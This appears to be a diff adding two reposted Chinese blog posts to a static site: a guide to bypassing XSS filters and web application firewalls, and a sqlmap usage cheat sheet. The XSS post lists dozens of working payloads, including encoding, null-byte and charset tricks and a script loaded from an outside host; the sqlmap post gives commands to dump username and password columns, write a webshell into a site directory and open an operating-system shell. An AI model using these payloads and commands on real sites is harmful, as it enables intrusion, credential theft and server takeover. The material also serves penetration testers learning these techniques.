@@ -263,6 +263,1444 @@
             
               
                 
+                <a class="post-title-link" href="/2016/11/17/Bypass xss过滤的测试方法/" itemprop="url">
+                  未命名
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-11-17T21:31:04+08:00" content="2016-11-17">
+              2016-11-17
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/11/17/Bypass xss过滤的测试方法/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/11/17/Bypass xss过滤的测试方法/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2016/11/17/Bypass xss过滤的测试方法/" class="leancloud_visitors" data-flag-title="">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Bypass-xss过滤的测试方法"><a href="#Bypass-xss过滤的测试方法" class="headerlink" title="Bypass xss过滤的测试方法"></a>Bypass xss过滤的测试方法</h1><p>转载于<a href="http://wooyun.jozxing.cc/static/drops/tips-845.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-845.html</a></p>
+<p>by五道口杀气 </p>
+<p>0x00 背景</p>
+<p>本文来自于《Modern Web Application Firewalls Fingerprinting and Bypassing XSS Filters》其中的bypass xss过滤的部分，前面有根据WAF特征确定是哪个WAF的测试方法给略过了，重点来看一下后面绕xss的一些基本的测试流程，虽说是绕WAF的，但这里还是根据WAF中的正则缺陷来绕过测试方法，并不是协议上问题，所以呢，基本可以通用于其他xss过滤的场景。方便新手们比较快速的了解到测试xss的一些基本的方法。</p>
+<p>0x01 Bypassing黑名单</p>
+<p>大多数的场所是用的黑名单来做过滤器的，有三种方式绕过黑名单的测试：</p>
+<p>1、暴力测试（输入大量的payload，看返回结果）<br>2、根据正则推算<br>3、利用浏览器bug<br>初步测试</p>
+<pre><code>1)尝试插入比较正常的HTML标签，例如：&lt;b&gt;，&lt;i&gt;，&lt;u&gt;来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。
+
+2)尝试插入不闭合的标签，例如：&lt;b，&lt;i，&lt;u，&lt;marquee然后看一下返回响应，是否对开放的标签也有过滤。
+
+3)然后测试几个XSS的payload，基本所有的xss过滤器都会进行过滤的：
+
+&lt;script&gt;alert(1);&lt;/script&gt;
+&lt;script&gt;prompt(1);&lt;/script&gt;
+&lt;script&gt;confirm(1);&lt;/script&gt;
+&lt;scriptsrc=&quot;http://rhainfosec.com/evil.js&quot;&gt;
+看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了alert,prompt,confirm字符，再尝试大小写的组合：
+
+&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;
+4)如果过滤器仅仅是把&lt;script&gt;和&lt;/script&gt;标签过滤掉，那么可以用
+
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;
+的方式来绕过，这样当&lt;script&gt;标签被过滤掉，剩下的组合起来刚好形成一个完整的payload。
+
+5)用&lt;a href标签来测试，看返回响应
+
+&lt;a href=&quot;http://www.google.com&quot;&gt;Clickme&lt;/a&gt;
+&lt;a标签是否被过滤 href是否被过滤 href里的数据是否被过滤
+如果没有数据被过滤，插入javascript协议看看：
+
+&lt;a href=&quot;javascript:alert(1)&quot;&gt;Clickme&lt;/a&gt;
+是否返回错误 javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符 尝试下大小写转换
+继续测试事件触发执行javascript：
+
+&lt;a href=&quot;rhainfosec.com&quot; onmouseover=alert(1)&gt;ClickHere&lt;/a&gt;
+看onmouseover事件是否被过滤。测试一个无效的事件，看过滤规则：
+
+&lt;a href=&quot;rhainfosec.com&quot; onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;
+是完整的返回了呢，还是跟onmouseover一样被干掉了。
+
+如果是完整的返回的话呢，那么意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件测试一个很少见的事件：
+
+&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit
+测试其他标签
+
+接下来测试其他的标签跟属性
+
+Src属性
+
+&lt;img src=x onerror=prompt(1);&gt;
+&lt;img/src=aaa.jpg onerror=prompt(1);
+&lt;video src=x onerror=prompt(1);&gt;
+&lt;audio src=x onerror=prompt(1);&gt;
+iframe标签
+
+&lt;iframe src=&quot;javascript:alert(2)&quot;&gt;
+&lt;iframe/src=&quot;data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;
+embed标签
+
+&lt;embed/src=//goo.gl/nlX0P&gt;
+action属性
+
+利用&lt;form，&lt;isindex等标签中的action属性执行javascript
+
+&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;
+&lt;isindex action=&quot;javascript:alert(1)&quot; type=image&gt;
+&lt;isindex action=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1) type=image&gt;
+&lt;isindex action=data:text/html, type=image&gt;
+&lt;formaction=&apos;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&apos;&gt;&lt;button&gt;CLICK
+formaction属性
+
+&lt;isindexformaction=&quot;javascript:alert(1)&quot; type=image&gt;
+&lt;input type=&quot;image&quot; formaction=JaVaScript:alert(0)&gt;
+&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME
+background属性
+
+&lt;table background=javascript:alert(1)&gt;&lt;/table// 在Opera 10.5和IE6上有效
+poster属性
+
+&lt;video poster=javascript:alert(1)//&gt;&lt;/video// Opera 10.5以下有效
+data属性
+
+&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt;
+&lt;object/data=//goo.gl/nlX0P?
+code属性
+
+&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;// Firefox有效
+&lt;embed code=&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot; allowscriptaccess=always&gt;
+事件触发
+
+&lt;svg/onload=prompt(1);&gt;
+&lt;marquee/onstart=confirm(2)&gt;/
+&lt;body onload=prompt(1);&gt;
+&lt;select autofocus onfocus=alert(1)&gt;
+&lt;textarea autofocus onfocus=alert(1)&gt;
+&lt;keygen autofocus onfocus=alert(1)&gt;
+&lt;video&gt;&lt;source onerror=&quot;javascript:alert(1)&quot;&gt;
+最短的测试向量
+
+&lt;q/oncut=open()&gt;
+&lt;q/oncut=alert(1)&gt;//在限制长度的地方很有效
+嵌套
+
+&lt;marquee&lt;marquee/onstart=confirm(2)&gt;/onstart=confirm(1)&gt;
+&lt;bodylanguage=vbsonload=alert-1//IE8有效
+&lt;command onmouseover
+=&quot;\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x6 6\x69\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B&quot;&gt;Save&lt;/command//IE8有效
+过滤括号的情况下
+
+当括号被过滤的时候可以使用throw来绕过
+
+&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&gt;
+&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;
+以上两个测试向量在Chrome跟IE在上面会出现一个“uncaught”的错误，可以用以下的向量：
+
+&lt;body/onload=javascript:window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&gt;
+expression属性
+
+&lt;img style=&quot;xss:expression(alert(0))&quot;// IE7以下
+&lt;div style=&quot;color:rgb(&apos;&apos;&amp;#0;x:expression(alert(1))&quot;&gt;&lt;/div// IE7以下
+&lt;style&gt;#test{x:expression(alert(/XSS/))}&lt;/style// IE7以下
+location属性
+
+&lt;a onmouseover=location=&apos;javascript:alert(1)&apos;&gt;click
+&lt;body onfocus=&quot;loaction=&apos;javascript:alert(1)&apos;&quot;&gt;123
+其他的一些payload
+
+&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=//goo.gl/nlX0P&quot;&gt;
+&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;g onload=&quot;javascript:\u0061lert(1);&quot;&gt;&lt;/g&gt;&lt;/svg&gt;
+&lt;svg xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt;&lt;a&gt;&lt;circle r=100 /&gt;&lt;animate attributeName=&quot;xlink:href&quot; values=&quot;;javascript:alert(1)&quot; begin=&quot;0s&quot; dur=&quot;0.1s&quot; fill=&quot;freeze&quot;/&gt;
+&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href=&quot;]]&gt;&lt;img/src=xx:xonerror=alert(2)//&quot;&gt;&lt;/svg&gt;
+&lt;meta content=&quot;&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&gt;
+&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click
+当= ( ) ; :被过滤时
+
+&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script// 通杀所有浏览器
+opera中可以不闭合
+
+&lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41 // Opera可查
+实体编码
+
+很多情况下WAF会实体编码用户的输入数据，
+
+javascript是一个很灵活的语言，可以使用很多编码，比如十六进制，Unicode和HTML。但是也对这些编码可以用在哪个位置有规定：
+
+属性：
+
+href=
+action=
+formaction=
+location=
+on*=
+name=
+background=
+poster=
+src=
+code=
+支持的编码方式：HTML，八进制，十进制，十六进制和Unicode
+
+属性：
+
+data=
+支持的编码：base64
+
+基于上下文的过滤
+
+WAF最大的问题，在于不知道输出的位置的上下文，导致根据具体环境可以绕过。
+
+输入在属性里
+
+&lt;input value=&quot;XSStest&quot; type=text&gt;
+可控位置为XSStest，可以使用
+
+&quot;&gt;&lt;img src=x onerror=prompt(0);&gt;
+如果&lt; &gt;被过滤的话可以换成
+
+&quot; autofocus onfocus=alert(1)//
+同样还有很多其他的payload：
+
+&quot;onmouseover=&quot; prompt(0)x=&quot;
+&quot;onfocusin=alert(1) autofocusx=&quot;
+&quot; onfocusout=alert(1) autofocus x=&quot;
+&quot;onblur=alert(1) autofocusa=&quot;
+输入在script标签中
+
+例如：
+
+&lt;script&gt;
+Var x=&quot;Input&quot;;
+&lt;/script&gt;
+可控位置在Input，可以闭合script标签插入代码，但是同样我们仅仅闭合双引号就可以执行js代码了
+
+&quot;;alert(1)//
+最终结果就是
+
+&lt;script&gt;
+Var x=&quot;&quot;;alert(1)//
+&lt;/script&gt;
+非常规的事件监听
+
+例如：
+
+&quot;;document.body.addEventListener(&quot;DOMActivate&quot;,alert(1))//
+&quot;;document.body.addEventListener(&quot;DOMActivate&quot;,prompt(1))//
+&quot;;document.body.addEventListener(&quot;DOMActivate&quot;,confirm(1))//
+下面是一些相同的类：
+
+DOMAttrModified
+DOMCharacterDataModified
+DOMFocusIn
+DOMFocusOut
+DOMMouseScroll
+DOMNodeInserted
+DOMNodeInsertedIntoDocument
+DOMNodeRemoved
+DOMNodeRemovedFromDocument
+DOMSubtreeModified
+HREF内容可控
+
+例如：
+
+&lt;a href=&quot;Userinput&quot;&gt;Click&lt;/a&gt;
+可控的是Userinput那里我们需要做的只是把javascript代码输入就好了：
+
+javascript:alert(1)//
+最后组合为：
+
+&lt;a href=&quot;javascript:alert(1)//&quot;&gt;Click&lt;/a&gt;
+变换
+
+使用HTML实体URL编码绕过黑名单，href里会自动实体解码，如果都失败了，可以尝试使用vbscript在IE10以下都有效，或者使用data协议。
+
+JavaScript变换
+
+使用javascript协议时可使用的例子：
+
+javascript&amp;#00058;alert(1)
+javaSCRIPT&amp;colon;alert(1)
+JaVaScRipT:alert(1)
+javas&amp;Tab;cript:\u0061lert(1);
+javascript:\u0061lert&amp;#x28;1&amp;#x29
+javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;
+Vbscript变换
+
+vbscript:alert(1);
+vbscript&amp;#00058;alert(1);
+vbscr&amp;Tab;ipt:alert(1)&quot;
+Data URl
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+JSON
+
+当你的输入会在encodeURIComponent当中显示出来的时候，很容易插入xss代码了
+
+encodeURIComponent(&apos;userinput&apos;)
+userinput处可控，测试代码：
+
+-alert(1)-
+-prompt(1)-
+-confirm(1)-
+最终结果：
+
+encodeURIComponent(&quot;-alert(1)-&quot;)
+encodeURIComponent(&quot;-prompt(1)-&quot;)
+SVG标签
+
+当返回结果在svg标签中的时候，会有一个特性
+
+&lt;svg&gt;&lt;script&gt;varmyvar=&quot;YourInput&quot;;&lt;/script&gt;&lt;/svg&gt;
+YourInput可控，输入
+
+www.site.com/test.php?var=text&quot;;alert(1)//
+如果把&quot;编码一些他仍然能够执行:
+
+&lt;svg&gt;&lt;script&gt;varmyvar=&quot;text&amp;quot;;alert(1)//&quot;;&lt;/script&gt;&lt;/svg&gt;
+浏览器bug
+
+字符集的bug在IE中出现过很多次，第一个就是UTF-7，但是这个只在之前的版本中可用，现在讨论一个在现在的浏览器当中可以执行的javascript。
+
+http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSS
+这个页面当中我们可控当前页面的字符集，当我们常规的测试时：
+
+http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=&quot;&gt;&lt;img src=x onerror=prompt(0);&gt;
+返回结果可以看到双引号被编码了：
+
+&lt;html&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/meta&gt;
+&lt;body&gt;
+&lt;input type=&quot;text&quot; value=&quot;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=prompt(0);&amp;gt;&quot;&gt;&lt;/input&gt;
+&lt;/body&gt;
+&lt;/html
+设置字符集为UTF-32：
+
+http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80
+上面这个在IE9及以下版本可以执行成功。
+
+利用0字节绕过：
+
+&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;
+&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;
+&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;
+在IE9及以下版本有效。
+</code></pre><p>其他等等一系列浏览器特性的XSS可以参考以下文章：</p>
+<p><a href="http://drops.wooyun.org/tips/147" target="_blank" rel="external">http://drops.wooyun.org/tips/147</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/11/15/SqlMap转载/" itemprop="url">
+                  未命名
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-11-15T11:16:42+08:00" content="2016-11-15">
+              2016-11-15
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/11/15/SqlMap转载/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/11/15/SqlMap转载/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2016/11/15/SqlMap转载/" class="leancloud_visitors" data-flag-title="">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Sqlmap 常见使用方法及详细参数<br>(好长时间不搞了，今天掏出sqlmap之后直接蒙住了–忘指令了–尴尬，于是百度了一下，想想还是转到博客里，以后忘了还可以回来再查，哈哈)</p>
+<p>Sqlmap使用教程</p>
+<p>sqlmap也是渗透中常用的一个注入工具，其实在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。</p>
+<p>今天把我一直以来整理的sqlmap笔记发布上来供大家参考。</p>
+<p>sqlmap简介</p>
+<p>sqlmap支持五种不同的注入模式：<br>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>联合查询注入，可以使用union的情况下的注入。<br>堆查询注入，可以同时执行多条语句的执行时的注入。</p>
+<p>sqlmap支持的数据库有</p>
+<p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
+<p>检测注入</p>
+<p>基本格式</p>
+<blockquote>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″
+</code></pre></blockquote>
+<p>默认使用level1检测全部数据库类型</p>
+<blockquote>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″ –dbms mysql –level 3
+</code></pre></blockquote>
+<p>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p>
+<p>跟随302跳转</p>
+<p>当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br>当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br>目的就是：要追踪到错误信息。</p>
+<p>cookie注入</p>
+<p>当程序有防get注入的时候，可以使用cookie注入</p>
+<blockquote>
+<pre><code>sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11″ –level 2（只有level达到2才会检测cookie）
+</code></pre></blockquote>
+<p>从post数据包中注入</p>
+<p>可以使用burpsuite或者temperdata等工具来抓取post包</p>
+<blockquote>
+<pre><code>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql 指定username参数
+</code></pre></blockquote>
+<p>注入成功后<br>获取数据库基本信息</p>
+<blockquote>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″ –dbms mysql –level 3 –dbs
+</code></pre></blockquote>
+<p>查询有哪些数据库</p>
+<blockquote>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″ –dbms mysql –level 3 -D test –tables
+</code></pre></blockquote>
+<p>查询test数据库中有哪些表</p>
+<blockquote>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″ –dbms mysql –level 3 -D test -T admin –columns
+</code></pre></blockquote>
+<p>查询test数据库中admin表有哪些字段</p>
+<blockquote>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1″ –dbms mysql –level 3 -D test -T admin -C “username,password” –dump
+</code></pre></blockquote>
+<p>dump出字段username与password中的数据</p>
+<p>其他命令参考下面</p>
+<p>从数据库中搜索字段</p>
+<blockquote>
+<pre><code>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password
+</code></pre></blockquote>
+<p>在dedecms数据库中搜索字段admin或者password。</p>
+<p>读取与写入文件</p>
+<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
+<blockquote>
+<pre><code>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
+–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
+–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+</code></pre><p>#示例：</p>
+<pre><code>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”
+</code></pre></blockquote>
+<p>使用shell命令：</p>
+<blockquote>
+<pre><code>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell
+</code></pre></blockquote>
+<p>接下来指定网站可写目录：</p>
+<blockquote>
+<pre><code>“E:\php\htdocs\dvwa”
+</code></pre></blockquote>
+<p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
+<p>sqlmap详细命令：</p>
+<blockquote>
+<pre><code>–is-dba 当前用户权限（是否为root权限）
+–dbs 所有数据库
+–current-db 网站当前数据库
+–users 所有数据库用户
+–current-user 当前数据库用户
+–random-agent 构造随机user-agent
+–passwords 数据库密码
+–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理
+–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+</code></pre></blockquote>
+<p>——————————————————————————————————</p>
+<blockquote>
+<pre><code>Options（选项）：
+
+–version 显示程序的版本号并退出
+-h, –help 显示此帮助消息并退出
+-v VERBOSE 详细级别：0-6（默认为1）
+</code></pre></blockquote>
+<p>Target（目标）：</p>
+<p>以下至少需要设置其中一个选项，设置目标URL。</p>
+<blockquote>
+<pre><code>-d DIRECT 直接连接到数据库。
+-u URL, –url=URL 目标URL。
+-l LIST 从Burp或WebScarab代理的日志中解析目标。
+-r REQUESTFILE 从一个文件中载入HTTP请求。
+-g GOOGLEDORK 处理Google dork的结果作为目标URL。
+-c CONFIGFILE 从INI配置文件中加载选项。
+</code></pre></blockquote>
+<p>Request（请求）：</p>
+<p>这些选项可以用来指定如何连接到目标URL。</p>
+<blockquote>
+<pre><code>–data=DATA 通过POST发送的数据字符串
+–cookie=COOKIE HTTP Cookie头
+–cookie-urlencode URL 编码生成的cookie注入
+–drop-set-cookie 忽略响应的Set – Cookie头信息
+–user-agent=AGENT 指定 HTTP User – Agent头
+–random-agent 使用随机选定的HTTP User – Agent头
+–referer=REFERER 指定 HTTP Referer头
+–headers=HEADERS 换行分开，加入其他的HTTP头
+–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
+–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
+–auth-cert=ACERT HTTP认证证书（key_file，cert_file）
+–proxy=PROXY 使用HTTP代理连接到目标URL
+–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
+–ignore-proxy 忽略系统默认的HTTP代理
+–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
+–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
+–retries=RETRIES 连接超时后重新连接的时间（默认3）
+–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
+–safe-url=SAFURL 在测试过程中经常访问的url地址
+–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
+</code></pre></blockquote>
+<p>Enumeration（枚举）：</p>
+<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br>您自己的SQL语句。</p>
+<blockquote>
+<pre><code>-b, –banner 检索数据库管理系统的标识
+–current-user 检索数据库管理系统当前用户
+–current-db 检索数据库管理系统当前数据库
+–is-dba 检测DBMS当前用户是否DBA
+–users 枚举数据库管理系统用户
+–passwords 枚举数据库管理系统用户密码哈希
+–privileges 枚举数据库管理系统用户的权限
+–roles 枚举数据库管理系统用户的角色
+–dbs 枚举数据库管理系统数据库
+-D DBname 要进行枚举的指定数据库名
+-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）
+–tables 枚举的DBMS数据库中的表
+–columns 枚举DBMS数据库表列
+–dump 转储数据库管理系统的数据库中的表项
+–dump-all 转储所有的DBMS数据库表中的条目
+–search 搜索列（S），表（S）和/或数据库名称（S）
+-C COL 要进行枚举的数据库列
+-U USER 用来进行枚举的数据库用户
+–exclude-sysdbs 枚举表时排除系统数据库
+–start=LIMITSTART 第一个查询输出进入检索
+–stop=LIMITSTOP 最后查询的输出进入检索
+–first=FIRSTCHAR 第一个查询输出字的字符检索
+–last=LASTCHAR 最后查询的输出字字符检索
+–sql-query=QUERY 要执行的SQL语句
+–sql-shell 提示交互式SQL的shell
+</code></pre></blockquote>
+<p>Optimization（优化）：</p>
+<p>这些选项可用于优化SqlMap的性能。</p>
+<blockquote>
+<pre><code>-o 开启所有优化开关
+–predict-output 预测常见的查询输出
+–keep-alive 使用持久的HTTP（S）连接
+–null-connection 从没有实际的HTTP响应体中检索页面长度
+–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）
+</code></pre></blockquote>
+<p>Injection（注入）：</p>
+<p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
+<blockquote>
+<pre><code>-p TESTPARAMETER 可测试的参数（S）
+–dbms=DBMS 强制后端的DBMS为此值
+–os=OS 强制后端的DBMS操作系统为这个值
+–prefix=PREFIX 注入payload字符串前缀
+–suffix=SUFFIX 注入payload字符串后缀
+–tamper=TAMPER 使用给定的脚本（S）篡改注入数据
+</code></pre></blockquote>
+<p>Detection（检测）：</p>
+<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
+<blockquote>
+<pre><code>–level=LEVEL 执行测试的等级（1-5，默认为1）
+–risk=RISK 执行测试的风险（0-3，默认为1）
+–string=STRING 查询时有效时在页面匹配字符串
+–regexp=REGEXP 查询时有效时在页面匹配正则表达式
+–text-only 仅基于在文本内容比较网页
+</code></pre></blockquote>
+<p>Techniques（技巧）：</p>
+<p>这些选项可用于调整具体的SQL注入测试。</p>
+<blockquote>
+<pre><code>–technique=TECH SQL注入技术测试（默认BEUST）
+–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+–union-cols=UCOLS 定列范围用于测试UNION查询注入
+–union-char=UCHAR 用于暴力猜解列数的字符
+</code></pre></blockquote>
+<p>Fingerprint（指纹）：</p>
+<blockquote>
+<pre><code>-f, –fingerprint 执行检查广泛的DBMS版本指纹
+</code></pre></blockquote>
+<p>Brute force（蛮力）：</p>
+<p>这些选项可以被用来运行蛮力检查。</p>
+<blockquote>
+<pre><code>–common-tables 检查存在共同表
+–common-columns 检查存在共同列
+</code></pre></blockquote>
+<p>User-defined function injection（用户自定义函数注入）：<br>这些选项可以用来创建用户自定义函数。</p>
+<blockquote>
+<pre><code>–udf-inject 注入用户自定义函数
+–shared-lib=SHLIB 共享库的本地路径
+</code></pre></blockquote>
+<p>File system access（访问文件系统）：</p>
+<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
+<blockquote>
+<pre><code>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件
+–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
+–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+</code></pre></blockquote>
+<p>Operating system access（操作系统访问）：</p>
+<p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
+<blockquote>
+<pre><code>–os-cmd=OSCMD 执行操作系统命令
+–os-shell 交互式的操作系统的shell
+–os-pwn 获取一个OOB shell，meterpreter或VNC
+–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
+–os-bof 存储过程缓冲区溢出利用
+–priv-esc 数据库进程用户权限提升
+–msf-path=MSFPATH Metasploit Framework本地的安装路径
+–tmp-path=TMPPATH 远程临时文件目录的绝对路径
+</code></pre></blockquote>
+<p>Windows注册表访问：</p>
+<p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
+<blockquote>
+<pre><code>–reg-read 读一个Windows注册表项值
+–reg-add 写一个Windows注册表项值数据
+–reg-del 删除Windows注册表键值
+–reg-key=REGKEY Windows注册表键
+–reg-value=REGVAL Windows注册表项值
+–reg-data=REGDATA Windows注册表键值数据
+–reg-type=REGTYPE Windows注册表项值类型
+</code></pre></blockquote>
+<p>这些选项可以用来设置一些一般的工作参数。</p>
+<blockquote>
+<pre><code>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
+-s SESSIONFILE 保存和恢复检索会话文件的所有数据
+–flush-session 刷新当前目标的会话文件
+–fresh-queries 忽略在会话文件中存储的查询结果
+–eta 显示每个输出的预计到达时间
+–update 更新SqlMap
+–save file保存选项到INI配置文件
+</code></pre></blockquote>
+<p>–batch 从不询问用户输入，使用所有默认配置。</p>
+<p>Miscellaneous（杂项）：</p>
+<blockquote>
+<pre><code>–beep 发现SQL注入时提醒
+–check-payload IDS对注入payloads的检测测试
+–cleanup SqlMap具体的UDF和表清理DBMS
+–forms 对目标URL的解析和测试形式
+–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
+–page-rank Google dork结果显示网页排名（PR）
+–parse-errors 从响应页面解析数据库管理系统的错误消息
+–replicate 复制转储的数据到一个sqlite3数据库
+–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
+–wizard 给初级用户的简单向导界面
+</code></pre></blockquote>
